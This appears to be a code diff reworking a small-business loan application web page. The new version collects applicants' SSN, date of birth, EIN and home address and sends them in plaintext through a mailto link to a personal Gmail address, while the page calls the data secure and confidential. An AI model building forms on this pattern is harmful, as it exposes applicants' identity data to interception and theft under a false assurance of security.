@@ -23,7 +23,6 @@
 <style>
   :root { --lime: #CCFF00; --ink: #0A0A0A; }
 
-  /* Grain texture overlay */
   body::after {
     content:''; position:fixed; inset:0; pointer-events:none; z-index:9999; opacity:0.028;
     background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
@@ -34,14 +33,9 @@
   html { scroll-behavior: smooth; }
   body { background: var(--ink); color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
 
-  /* Reveal animation */
   .reveal { opacity: 0; transform: translateY(22px); transition: opacity 0.65s ease, transform 0.65s cubic-bezier(0.22,1,0.36,1); }
   .reveal.visible { opacity: 1; transform: translateY(0); }
 
-  .lime-underline { position: relative; display: inline-block; }
-  .lime-underline::after { content:''; position:absolute; bottom:-6px; left:0; width:60px; height:3px; background: var(--lime); border-radius:2px; }
-
-  /* Form styles */
   .form-input, .form-select, .form-textarea {
     width: 100%;
     padding: 12px 16px;
@@ -102,10 +96,23 @@
   }
   .btn-outline:hover { background: white; color: var(--ink); border-color: white; }
   .chip { display:inline-block; background:rgba(204,255,0,0.15); color: var(--lime); font-size:11px; font-weight:700; letter-spacing:0.1em; text-transform:uppercase; padding:4px 12px; border-radius:20px; }
-  .step-circle { width:40px; height:40px; border-radius:50%; background: var(--lime); color: var(--ink); display:flex; align-items:center; justify-content:center; font-weight:700; font-size:15px; flex-shrink:0; }
   ::-webkit-scrollbar { width: 8px; }
   ::-webkit-scrollbar-track { background: #1a1a1a; }
   ::-webkit-scrollbar-thumb { background: #CCFF00; border-radius: 4px; }
+  
+  .form-section {
+    margin-bottom: 24px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid rgba(255,255,255,0.08);
+  }
+  .section-title {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 18px;
+    font-weight: 600;
+    color: var(--lime);
+    margin-bottom: 20px;
+    letter-spacing: -0.02em;
+  }
 </style>
 </head>
 <body class="bg-ink text-white font-body overflow-x-hidden">
@@ -113,7 +120,7 @@
 <?php include('header.php'); ?>
 
 <!-- Hero Section -->
-<section class="relative overflow-hidden min-h-[40vh] flex items-center justify-center pt-16">
+<section class="relative overflow-hidden min-h-[35vh] flex items-center justify-center pt-16">
   <div class="absolute inset-0 bg-cover bg-center" style="background-image: url('https://images.unsplash.com/photo-1554224155-6726b3ff858f?w=1600&q=80'); opacity: 0.25;"></div>
   <div class="absolute inset-0 bg-gradient-to-t from-ink via-ink/80 to-transparent"></div>
   <div class="relative z-10 max-w-7xl mx-auto px-6 md:px-12 py-16 w-full text-center">
@@ -124,33 +131,12 @@
     <h1 class="font-display text-white text-5xl md:text-6xl lg:text-7xl tracking-tight leading-[1.1]">
       Apply for <span class="text-lime">Business Funding</span>
     </h1>
-    <p class="text-white/50 text-base max-w-2xl mx-auto mt-6 font-light">Complete the form below and one of our loan specialists will contact you within 24 hours.</p>
+    <p class="text-white/50 text-base max-w-2xl mx-auto mt-6 font-light">Complete the form below. When you submit, your email client will open with the application pre-filled — just hit send!</p>
   </div>
 </section>
 
 <main class="max-w-4xl mx-auto px-4 sm:px-6 py-12">
   
-  <!-- Progress Steps -->
-  <div class="reveal mb-12">
-    <div class="flex items-center justify-between max-w-md mx-auto">
-      <div class="text-center">
-        <div class="step-circle mx-auto mb-2">1</div>
-        <p class="text-[11px] text-white/40 uppercase tracking-wide">Information</p>
-      </div>
-      <div class="flex-1 h-px bg-white/10 mx-4"></div>
-      <div class="text-center">
-        <div class="step-circle mx-auto mb-2 bg-white/10 text-white/40">2</div>
-        <p class="text-[11px] text-white/40 uppercase tracking-wide">Business</p>
-      </div>
-      <div class="flex-1 h-px bg-white/10 mx-4"></div>
-      <div class="text-center">
-        <div class="step-circle mx-auto mb-2 bg-white/10 text-white/40">3</div>
-        <p class="text-[11px] text-white/40 uppercase tracking-wide">Loan</p>
-      </div>
-    </div>
-    <p class="text-center text-white/30 text-[12px] mt-4">Step 1 of 3 — Tell us about yourself</p>
-  </div>
-
   <!-- Application Form -->
   <div class="reveal bg-[#0d0d0d] rounded-2xl border border-white/[0.07] p-6 md:p-8">
     <div class="text-center mb-8">
@@ -159,117 +145,107 @@
       <p class="text-white/40 text-sm mt-3">All information is secure and confidential. No impact on your credit score.</p>
     </div>
 
-    <form id="loanApplicationForm" method="POST" action="#">
-      <!-- Step 1: Personal Information -->
-      <div id="step1" class="form-step active">
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
-          <div>
-            <label class="required">First Name</label>
-            <input type="text" class="form-input" placeholder="John" required>
-          </div>
-          <div>
-            <label class="required">Last Name</label>
-            <input type="text" class="form-input" placeholder="Doe" required>
-          </div>
-          <div>
-            <label class="required">Email Address</label>
-            <input type="email" class="form-input" placeholder="john.doe@company.com" required>
-          </div>
-          <div>
-            <label class="required">Phone Number</label>
-            <input type="tel" class="form-input" placeholder="(555) 555-1234" required>
-          </div>
-          <div class="md:col-span-2">
-            <label>Best Time to Call</label>
-            <select class="form-select">
-              <option value="">Select a time</option>
-              <option>Morning (9am - 12pm)</option>
-              <option>Afternoon (12pm - 4pm)</option>
-              <option>Evening (4pm - 7pm)</option>
-            </select>
-          </div>
-        </div>
-      </div>
-
-      <!-- Step 2: Business Information -->
-      <div id="step2" class="form-step hidden">
+    <form id="loanApplicationForm">
+      <!-- Section 1: Business Information -->
+      <div class="form-section">
+        <h3 class="section-title">Business Information</h3>
         <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
           <div class="md:col-span-2">
-            <label class="required">Business Name</label>
-            <input type="text" class="form-input" placeholder="Your Company LLC" required>
+            <label class="required">Legal Business Name</label>
+            <input type="text" id="legal_business_name" class="form-input" placeholder="Enter legal business name" required>
           </div>
           <div>
-            <label class="required">Business Type</label>
-            <select class="form-select" required>
-              <option value="">Select business type</option>
-              <option>Sole Proprietorship</option>
+            <label class="required">Entity Type</label>
+            <select id="entity_type" class="form-select" required>
+              <option value="">Select entity type</option>
               <option>LLC</option>
-              <option>Corporation (S-Corp/C-Corp)</option>
+              <option>Sole Proprietorship</option>
+              <option>S Corporation</option>
+              <option>C Corporation</option>
               <option>Partnership</option>
               <option>Non-Profit</option>
             </select>
           </div>
           <div>
-            <label class="required">Years in Business</label>
-            <select class="form-select" required>
-              <option value="">Select</option>
-              <option>Less than 6 months</option>
-              <option>6 months - 1 year</option>
-              <option>1 - 2 years</option>
-              <option>2 - 5 years</option>
-              <option>5+ years</option>
-            </select>
+            <label class="required">Business EIN</label>
+            <input type="text" id="business_ein" class="form-input" placeholder="XX-XXXXXXX" required>
           </div>
           <div>
-            <label class="required">Annual Revenue</label>
-            <select class="form-select" required>
-              <option value="">Select revenue range</option>
-              <option>Less than $50,000</option>
-              <option>$50,000 - $100,000</option>
-              <option>$100,000 - $250,000</option>
-              <option>$250,000 - $500,000</option>
-              <option>$500,000 - $1M</option>
-              <option>$1M - $5M</option>
-              <option>$5M+</option>
-            </select>
+            <label class="required">Business Start Date</label>
+            <input type="text" id="business_start_date" class="form-input" placeholder="MM-DD-YYYY" required>
           </div>
           <div>
-            <label>Credit Score (if known)</label>
-            <select class="form-select">
-              <option value="">Select credit range</option>
-              <option>Excellent (720+)</option>
-              <option>Good (680-719)</option>
-              <option>Fair (620-679)</option>
-              <option>Below 620</option>
-              <option>Not sure</option>
+            <label class="required">Date</label>
+            <input type="text" id="application_date" class="form-input" placeholder="MM-DD-YYYY" value="<?php echo date('m-d-Y'); ?>">
+          </div>
+          <div>
+            <label class="required">Industry / Business Category</label>
+            <select id="industry" class="form-select" required>
+              <option value="">Select industry</option>
+              <option>Auto Repair</option>
+              <option>Attorney / Legal Services</option>
+              <option>Cleaning Business</option>
+              <option>Construction</option>
+              <option>Convenience Store</option>
+              <option>Daycare</option>
+              <option>Beauty Salon / Spa</option>
+              <option>Accounting / CPA</option>
+              <option>Restaurant / Food Service</option>
+              <option>Retail</option>
+              <option>Wholesale / Distribution</option>
+              <option>Medical / Healthcare</option>
+              <option>Other</option>
             </select>
           </div>
           <div class="md:col-span-2">
-            <label>Business Address</label>
-            <input type="text" class="form-input" placeholder="Street address">
+            <label class="required">Business Address (Street, City, State, Zip Code)</label>
+            <input type="text" id="business_address" class="form-input" placeholder="123 Main St, New York, NY 10001" required>
           </div>
         </div>
       </div>
 
-      <!-- Step 3: Loan Details -->
-      <div id="step3" class="form-step hidden">
+      <!-- Section 2: Owner/Principal Information -->
+      <div class="form-section">
+        <h3 class="section-title">Owner / Principal Information</h3>
         <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
           <div>
-            <label class="required">Loan Amount Needed</label>
-            <select class="form-select" required>
-              <option value="">Select amount</option>
-              <option>$5,000 - $25,000</option>
-              <option>$25,000 - $50,000</option>
-              <option>$50,000 - $100,000</option>
-              <option>$100,000 - $250,000</option>
-              <option>$250,000 - $500,000</option>
-              <option>$500,000 - $1,000,000</option>
-              <option>$1,000,000+</option>
-            </select>
+            <label class="required">Merchant Full Name</label>
+            <input type="text" id="merchant_full_name" class="form-input" placeholder="First and Last Name" required>
           </div>
           <div>
-            <label class="required">Loan Purpose</label>
-            <select class="form-select" required>
+            <label class="required">Merchant Date of Birth</label>
+            <input type="text" id="merchant_dob" class="form-input" placeholder="MM-DD-YYYY" required>
+          </div>
+          <div>
+            <label class="required">Merchant SSN</label>
+            <input type="text" id="merchant_ssn" class="form-input" placeholder="XXX-XX-XXXX" required>
+          </div>
+          <div>
+            <label class="required">Ownership %</label>
+            <input type="text" id="ownership_percent" class="form-input" placeholder="100%" required>
+          </div>
+          <div class="md:col-span-2">
+            <label class="required">Home Address</label>
+            <input type="text" id="home_address" class="form-input" placeholder="Street, City, State, Zip Code" required>
+          </div>
+          <div>
+            <label class="required">Best Phone Number</label>
+            <input type="tel" id="phone" class="form-input" placeholder="(000) 000-0000" required>
+          </div>
+          <div>
+            <label class="required">Email Address</label>
+            <input type="email" id="email" class="form-input" placeholder="example@company.com" required>
+          </div>
+        </div>
+      </div>
+
+      <!-- Section 3: Loan Details -->
+      <div class="form-section">
+        <h3 class="section-title">Loan Details</h3>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+          <div>
+            <label class="required">Purpose of Funding</label>
+            <select id="purpose_of_funding" class="form-select" required>
               <option value="">Select purpose</option>
               <option>Working Capital</option>
               <option>Equipment Purchase</option>
@@ -279,25 +255,42 @@
               <option>Inventory / Stock</option>
               <option>Construction / Renovation</option>
               <option>Startup Funding</option>
+              <option>Marketing / Advertising</option>
+              <option>Hiring / Payroll</option>
+            </select>
+          </div>
+          <div>
+            <label class="required">Loan Amount Needed</label>
+            <select id="loan_amount" class="form-select" required>
+              <option value="">Select amount</option>
+              <option>$5,000 - $25,000</option>
+              <option>$25,000 - $50,000</option>
+              <option>$50,000 - $100,000</option>
+              <option>$100,000 - $250,000</option>
+              <option>$250,000 - $500,000</option>
+              <option>$500,000 - $1,000,000</option>
+              <option>$1,000,000 - $2,500,000</option>
+              <option>$2,500,000+</option>
             </select>
           </div>
           <div class="md:col-span-2">
-            <label>Tell us more about your funding needs (optional)</label>
-            <textarea rows="3" class="form-textarea" placeholder="Briefly describe how you plan to use the funds..."></textarea>
+            <label>Open Loans (If Yes - Please Mention Open Balance / Payments)</label>
+            <textarea id="open_loans" rows="2" class="form-textarea" placeholder="List any existing loans, balances, and monthly payments..."></textarea>
+          </div>
+          <div class="md:col-span-2">
+            <label>Additional Information (Optional)</label>
+            <textarea id="additional_info" rows="3" class="form-textarea" placeholder="Any other details you'd like us to know about your business or funding needs..."></textarea>
           </div>
         </div>
       </div>
 
-      <!-- Form Navigation Buttons -->
-      <div class="flex justify-between mt-8 pt-6 border-t border-white/10">
-        <button type="button" id="prevBtn" class="btn-outline px-6 py-3 hidden">← Previous</button>
-        <button type="button" id="nextBtn" class="btn-gold px-8 py-3 ml-auto">Next Step →</button>
-        <button type="submit" id="submitBtn" class="btn-gold px-8 py-3 hidden">Submit Application →</button>
+      <div class="mt-6 pt-4 border-t border-white/10">
+        <button type="button" id="submitBtn" class="btn-gold w-full">Send Application →</button>
       </div>
     </form>
 
     <div class="mt-6 text-center">
-      <p class="text-white/30 text-[11px]">Your information is protected by 256-bit SSL encryption</p>
+      <p class="text-white/30 text-[11px]">Your information is secure. Click Send to open your email client.</p>
     </div>
   </div>
 
@@ -327,160 +320,141 @@
       <h3 class="font-display text-2xl text-white">Frequently Asked Questions</h3>
     </div>
     <div class="space-y-4 max-w-2xl mx-auto">
-      <div class="border-b border-white/10 pb-3">
-        <button class="faq-question w-full text-left flex justify-between items-center text-white font-medium hover:text-lime transition-colors">
-          <span>How long does it take to get funded?</span>
-          <svg class="w-5 h-5 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
-        </button>
-        <div class="faq-answer hidden mt-2 text-white/50 text-sm">Most applicants receive funding within 24-48 hours after final approval. The application process itself takes less than 10 minutes.</div>
-      </div>
-      <div class="border-b border-white/10 pb-3">
-        <button class="faq-question w-full text-left flex justify-between items-center text-white font-medium hover:text-lime transition-colors">
-          <span>Will applying affect my credit score?</span>
-          <svg class="w-5 h-5 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
-        </button>
-        <div class="faq-answer hidden mt-2 text-white/50 text-sm">No. Our initial application uses a soft credit pull that does not impact your credit score. A hard pull only occurs when you move forward with an offer.</div>
-      </div>
-      <div class="border-b border-white/10 pb-3">
-        <button class="faq-question w-full text-left flex justify-between items-center text-white font-medium hover:text-lime transition-colors">
-          <span>What are the minimum requirements?</span>
-          <svg class="w-5 h-5 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
-        </button>
-        <div class="faq-answer hidden mt-2 text-white/50 text-sm">We work with businesses of all sizes. Generally, we look for 6+ months in business, minimum $50,000 annual revenue, and a personal credit score of 550+. However, we consider all applications.</div>
-      </div>
-      <div class="pb-3">
-        <button class="faq-question w-full text-left flex justify-between items-center text-white font-medium hover:text-lime transition-colors">
-          <span>What types of loans do you offer?</span>
-          <svg class="w-5 h-5 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
-        </button>
-        <div class="faq-answer hidden mt-2 text-white/50 text-sm">SBA Loans, Business Term Loans, Commercial Real Estate, Construction Loans, Bridge Loans, Lines of Credit, and Equipment Financing.</div>
-      </div>
+      <div class="border-b border-white/10 pb-3"><button class="faq-question w-full text-left flex justify-between items-center text-white font-medium hover:text-lime transition-colors"><span>How long does it take to get funded?</span><svg class="w-5 h-5 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg></button><div class="faq-answer hidden mt-2 text-white/50 text-sm">Most applicants receive funding within 24-48 hours after final approval.</div></div>
+      <div class="border-b border-white/10 pb-3"><button class="faq-question w-full text-left flex justify-between items-center text-white font-medium hover:text-lime transition-colors"><span>Will applying affect my credit score?</span><svg class="w-5 h-5 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg></button><div class="faq-answer hidden mt-2 text-white/50 text-sm">No. Our initial application uses a soft credit pull that does not impact your credit score.</div></div>
+      <div class="border-b border-white/10 pb-3"><button class="faq-question w-full text-left flex justify-between items-center text-white font-medium hover:text-lime transition-colors"><span>What are the minimum requirements?</span><svg class="w-5 h-5 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg></button><div class="faq-answer hidden mt-2 text-white/50 text-sm">We look for 6+ months in business, $50k+ annual revenue, and credit score 550+.</div></div>
+      <div class="pb-3"><button class="faq-question w-full text-left flex justify-between items-center text-white font-medium hover:text-lime transition-colors"><span>What types of loans do you offer?</span><svg class="w-5 h-5 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg></button><div class="faq-answer hidden mt-2 text-white/50 text-sm">SBA Loans, Business Term Loans, Commercial Real Estate, Construction Loans, Bridge Loans, and Equipment Financing.</div></div>
     </div>
   </div>
 </main>
 
-<footer class="bg-ink mt-12 border-t border-white/[0.07] py-8 text-center text-white/40 text-xs">
-  <p>© 2025 HarbourFundingSolutions. All rights reserved.</p>
-</footer>
+<?php @include('footer.php'); ?>
 
 <script>
   // Reveal on scroll
   const ro = new IntersectionObserver(entries => entries.forEach(e => { if(e.isIntersecting) e.target.classList.add('visible'); }), { threshold: 0.1 });
   document.querySelectorAll('.reveal').forEach(el => ro.observe(el));
-
-  // Multi-step form navigation
-  let currentStep = 1;
-  const totalSteps = 3;
-  
-  const step1 = document.getElementById('step1');
-  const step2 = document.getElementById('step2');
-  const step3 = document.getElementById('step3');
-  const prevBtn = document.getElementById('prevBtn');
-  const nextBtn = document.getElementById('nextBtn');
-  const submitBtn = document.getElementById('submitBtn');
-  const stepCircles = document.querySelectorAll('.step-circle');
-  
-  function updateSteps() {
-    // Hide all steps
-    step1.classList.add('hidden');
-    step2.classList.add('hidden');
-    step3.classList.add('hidden');
-    
-    // Show current step
-    if (currentStep === 1) step1.classList.remove('hidden');
-    if (currentStep === 2) step2.classList.remove('hidden');
-    if (currentStep === 3) step3.classList.remove('hidden');
-    
-    // Update buttons
-    if (currentStep === 1) {
-      prevBtn.classList.add('hidden');
-      nextBtn.classList.remove('hidden');
-      submitBtn.classList.add('hidden');
-      nextBtn.classList.remove('ml-auto');
-      nextBtn.classList.add('ml-auto');
-    } else if (currentStep === totalSteps) {
-      prevBtn.classList.remove('hidden');
-      nextBtn.classList.add('hidden');
-      submitBtn.classList.remove('hidden');
-    } else {
-      prevBtn.classList.remove('hidden');
-      nextBtn.classList.remove('hidden');
-      submitBtn.classList.add('hidden');
-    }
-    
-    // Update step circles styling
-    for (let i = 0; i < stepCircles.length; i++) {
-      const circle = stepCircles[i];
-      const stepNum = i + 1;
-      if (stepNum < currentStep) {
-        circle.style.background = 'var(--lime)';
-        circle.style.color = 'var(--ink)';
-      } else if (stepNum === currentStep) {
-        circle.style.background = 'var(--lime)';
-        circle.style.color = 'var(--ink)';
-      } else {
-        circle.style.background = 'rgba(255,255,255,0.1)';
-        circle.style.color = 'rgba(255,255,255,0.4)';
-      }
-    }
-  }
-  
-  nextBtn.addEventListener('click', () => {
-    if (currentStep < totalSteps) {
-      currentStep++;
-      updateSteps();
-    }
-  });
-  
-  prevBtn.addEventListener('click', () => {
-    if (currentStep > 1) {
-      currentStep--;
-      updateSteps();
-    }
-  });
-  
-  // Form submission
-  const form = document.getElementById('loanApplicationForm');
-  form.addEventListener('submit', (e) => {
-    e.preventDefault();
-    // Simple validation check
-    const requiredFields = form.querySelectorAll('[required]');
-    let isValid = true;
-    let currentStepFields = [];
-    
-    if (currentStep === 1) currentStepFields = step1.querySelectorAll('[required]');
-    else if (currentStep === 2) currentStepFields = step2.querySelectorAll('[required]');
-    else if (currentStep === 3) currentStepFields = step3.querySelectorAll('[required]');
-    
-    currentStepFields.forEach(field => {
-      if (!field.value.trim()) {
-        isValid = false;
-        field.style.borderColor = '#ff4444';
-        setTimeout(() => { field.style.borderColor = ''; }, 2000);
-      }
-    });
-    
-    if (isValid && currentStep === totalSteps) {
-      alert('Thank you for your application! A loan specialist will contact you within 24 hours.');
-      // In production, you would submit the form data via AJAX here
-      form.reset();
-      currentStep = 1;
-      updateSteps();
-    } else if (currentStep !== totalSteps) {
-      currentStep++;
-      updateSteps();
-    }
-  });
   
   // FAQ accordion
-  const faqButtons = document.querySelectorAll('.faq-question');
-  faqButtons.forEach(btn => {
+  document.querySelectorAll('.faq-question').forEach(btn => {
     btn.addEventListener('click', () => {
       const answer = btn.nextElementSibling;
       const arrow = btn.querySelector('svg');
       answer.classList.toggle('hidden');
       arrow.style.transform = answer.classList.contains('hidden') ? 'rotate(0deg)' : 'rotate(180deg)';
     });
+  });
+  
+  function getFormData() {
+    return {
+      legalBusinessName: document.getElementById('legal_business_name').value,
+      entityType: document.getElementById('entity_type').value,
+      businessEIN: document.getElementById('business_ein').value,
+      businessStartDate: document.getElementById('business_start_date').value,
+      applicationDate: document.getElementById('application_date').value,
+      industry: document.getElementById('industry').value,
+      businessAddress: document.getElementById('business_address').value,
+      merchantFullName: document.getElementById('merchant_full_name').value,
+      merchantDOB: document.getElementById('merchant_dob').value,
+      merchantSSN: document.getElementById('merchant_ssn').value,
+      ownershipPercent: document.getElementById('ownership_percent').value,
+      homeAddress: document.getElementById('home_address').value,
+      phone: document.getElementById('phone').value,
+      email: document.getElementById('email').value,
+      purposeOfFunding: document.getElementById('purpose_of_funding').value,
+      loanAmount: document.getElementById('loan_amount').value,
+      openLoans: document.getElementById('open_loans').value || 'None',
+      additionalInfo: document.getElementById('additional_info').value || 'None'
+    };
+  }
+  
+  function validateForm() {
+    const requiredFields = [
+      'legal_business_name', 'entity_type', 'business_ein', 'business_start_date',
+      'industry', 'business_address', 'merchant_full_name', 'merchant_dob',
+      'merchant_ssn', 'ownership_percent', 'home_address', 'phone', 'email',
+      'purpose_of_funding', 'loan_amount'
+    ];
+    let isValid = true;
+    for (let fieldId of requiredFields) {
+      const field = document.getElementById(fieldId);
+      if (!field.value.trim()) {
+        field.style.borderColor = '#ff4444';
+        setTimeout(() => { field.style.borderColor = ''; }, 2000);
+        isValid = false;
+      }
+    }
+    return isValid;
+  }
+  
+  // Submit — opens default mail client with pre-filled data
+  document.getElementById('submitBtn').addEventListener('click', () => {
+    if (!validateForm()) return;
+    
+    const data = getFormData();
+    const currentDate = new Date().toLocaleString();
+    const recipient = 'muhibkhan2299@gmail.com';
+    const subject = `Loan Application - ${data.legalBusinessName} - ${data.merchantFullName}`;
+    
+    const emailBody = `
+========================================
+NEW BUSINESS LOAN APPLICATION
+========================================
+Application Date: ${currentDate}
+
+========================================
+BUSINESS INFORMATION
+========================================
+Legal Business Name: ${data.legalBusinessName}
+Entity Type: ${data.entityType}
+Business EIN: ${data.businessEIN}
+Business Start Date: ${data.businessStartDate}
+Industry / Category: ${data.industry}
+Business Address: ${data.businessAddress}
+
+========================================
+OWNER / PRINCIPAL INFORMATION
+========================================
+Merchant Full Name: ${data.merchantFullName}
+Date of Birth: ${data.merchantDOB}
+SSN: ${data.merchantSSN}
+Ownership %: ${data.ownershipPercent}
+Home Address: ${data.homeAddress}
+Phone Number: ${data.phone}
+Email Address: ${data.email}
+
+========================================
+LOAN DETAILS
+========================================
+Purpose of Funding: ${data.purposeOfFunding}
+Loan Amount Needed: ${data.loanAmount}
+Open Loans (Balances/Payments): 
+${data.openLoans}
+
+Additional Information:
+${data.additionalInfo}
+
+========================================
+SUBMITTED VIA: HarbourFundingSolutions Website
+========================================
+Please contact the applicant at ${data.phone} or ${data.email} within 24 hours.
+
+---
+HarbourFundingSolutions
+Empowering Business Growth
+    `;
+    
+    const mailtoLink = `mailto:${recipient}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(emailBody)}`;
+    window.location.href = mailtoLink;
+    
+    setTimeout(() => {
+      alert('✓ Your email client has been opened!\n\n✓ The application has been pre-filled in the email body.\n\n✓ Please review and click Send to complete your application.\n\n✓ We will contact you within 24 hours after receiving your email.');
+    }, 300);
+    
+    // Reset form after sending
+    document.getElementById('loanApplicationForm').reset();
+    // Reset date field to current date
+    document.getElementById('application_date').value = '<?php echo date('m-d-Y'); ?>';
   });
 </script>
 </body>
